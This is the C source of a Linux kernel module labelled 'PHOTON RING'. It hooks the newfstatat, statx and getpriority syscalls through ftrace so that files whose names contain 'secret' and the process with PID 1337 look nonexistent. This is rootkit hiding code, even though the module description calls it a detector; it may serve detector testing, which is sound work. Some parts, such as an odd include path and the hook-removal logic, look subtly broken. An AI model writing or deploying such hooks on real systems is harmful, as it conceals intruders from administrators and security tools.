#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/ftrace.h>
#include <linux/string.h>

#include ".../include/hiding_stat.h"
#include "../include/kprobe_detector.h"

#define HIDDEN_STRING "secret"
#define HIDDEN_PID 1337

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Dustin");
MODULE_DESCRIPTION("Detect hiding stat behavior");
MODULE_VERSION("1.0");

static struct ftrace_ops ops_newfstatat;
static struct ftrace_ops ops_statx;
static struct ftrace_ops ops_getpriority;

/* Hook tracking */
static int hooks_installed = 0;

/* ============================= */
/* newfstatat HOOK               */
/* ============================= */

static notrace void hook_newfstatat(unsigned long ip, unsigned long parent_ip,
                                    struct ftrace_ops *ops,
                                    struct ftrace_regs *fregs)
{
    const char __user *filename;
    char kbuf[256];

    filename = (const char __user *)PHOTON_RING_GET_ARG(fregs, 1);

    if (!filename)
        return;

    if (strncpy_from_user(kbuf, filename, sizeof(kbuf)) > 0)
    {
        if (strstr(kbuf, HIDDEN_STRING))
        {
            printk(KERN_ALERT "[PHOTON RING] hiding file via newfstatat: %s\n", kbuf);

            /* Force return -ENOENT */
            PHOTON_RING_SET_RET(fregs, -ENOENT);
        }
    }
}

/* ============================= */
/* statx HOOK                    */
/* ============================= */

static notrace void hook_statx(unsigned long ip, unsigned long parent_ip,
                               struct ftrace_ops *ops,
                               struct ftrace_regs *fregs)
{
    const char __user *filename;
    char kbuf[256];

    filename = (const char __user *)PHOTON_RING_GET_ARG(fregs, 1);

    if (!filename)
        return;

    if (strncpy_from_user(kbuf, filename, sizeof(kbuf)) > 0)
    {
        if (strstr(kbuf, HIDDEN_STRING))
        {
            printk(KERN_ALERT "[PHOTON RING] hiding file via statx: %s\n", kbuf);

            PHOTON_RING_SET_RET(fregs, -ENOENT);
        }
    }
}

/* ============================= */
/* getpriority HOOK              */
/* ============================= */

static notrace void hook_getpriority(unsigned long ip, unsigned long parent_ip,
                                     struct ftrace_ops *ops,
                                     struct ftrace_regs *fregs)
{
    int which = (int)PHOTON_RING_GET_ARG(fregs, 0);
    int who = (int)PHOTON_RING_GET_ARG(fregs, 1);

    if (which == PRIO_PROCESS && who == HIDDEN_PID)
    {
        printk(KERN_ALERT "[PHOTON RING] hiding getpriority for pid: %d\n", who);

        PHOTON_RING_SET_RET(fregs, -ESRCH);
    }
}

/* ============================= */
/* INIT                          */
/* ============================= */

int hiding_stat_init(void)
{
    int ret;
    unsigned long addr;

    hooks_installed = 0;

    printk(KERN_INFO "[PHOTON RING] initializing hiding_stat module...\n");

    /* ---------- newfstatat ---------- */

    addr = (unsigned long)__x64_sys_newfstatat;

    ops_newfstatat.func = hook_newfstatat;
    ops_newfstatat.flags = PHOTON_RING_FTRACE_FLAGS;

    ret = ftrace_set_filter_ip(&ops_newfstatat, addr, 0, 0);
    if (ret)
        return ret;

    ret = register_ftrace_function(&ops_newfstatat);
    if (ret)
        return ret;

    hooks_installed++;
    printk(KERN_INFO "[PHOTON RING] hooked __x64_sys_newfstatat\n");

    /* ---------- statx ---------- */

    addr = (unsigned long)__x64_sys_statx;

    ops_statx.func = hook_statx;
    ops_statx.flags = PHOTON_RING_FTRACE_FLAGS;

    ret = ftrace_set_filter_ip(&ops_statx, addr, 0, 0);
    if (ret)
        return ret;

    ret = register_ftrace_function(&ops_statx);
    if (ret)
        return ret;

    hooks_installed++;
    printk(KERN_INFO "[PHOTON RING] hooked __x64_sys_statx\n");

    /* ---------- getpriority ---------- */

    addr = (unsigned long)__x64_sys_getpriority;

    ops_getpriority.func = hook_getpriority;
    ops_getpriority.flags = PHOTON_RING_FTRACE_FLAGS;

    ret = ftrace_set_filter_ip(&ops_getpriority, addr, 0, 0);
    if (ret)
        return ret;

    ret = register_ftrace_function(&ops_getpriority);
    if (ret)
        return ret;

    hooks_installed++; // <-- TRACK
    printk(KERN_INFO "[PHOTON RING] hooked __x64_sys_getpriority\n");

    printk(KERN_INFO "[PHOTON RING] hiding_stat active (hooks installed: %d)\n",
           hooks_installed);
    return 0;
}

/* ============================= */
/* EXIT                          */
/* ============================= */

void hiding_stat_exit(void)
{
    printk(KERN_INFO "[PHOTON RING] removing hiding_stat...\n");
//hook exit behaviors
    if (hooks_installed > 0)
    {
        unregister_ftrace_function(&ops_newfstatat);
        ftrace_set_filter_ip(&ops_newfstatat, 0, 1, 0);
        hooks_installed--;
    }

    if (hooks_installed > 0)
    {
        unregister_ftrace_function(&ops_statx);
        ftrace_set_filter_ip(&ops_statx, 0, 1, 0);
        hooks_installed--;
    }

    if (hooks_installed > 0)
    {
        unregister_ftrace_function(&ops_getpriority);
        ftrace_set_filter_ip(&ops_getpriority, 0, 1, 0);
        hooks_installed--;
    }

    printk(KERN_INFO "[PHOTON RING] hiding_stat removed (hooks remaining: %d)\n",
           hooks_installed);
}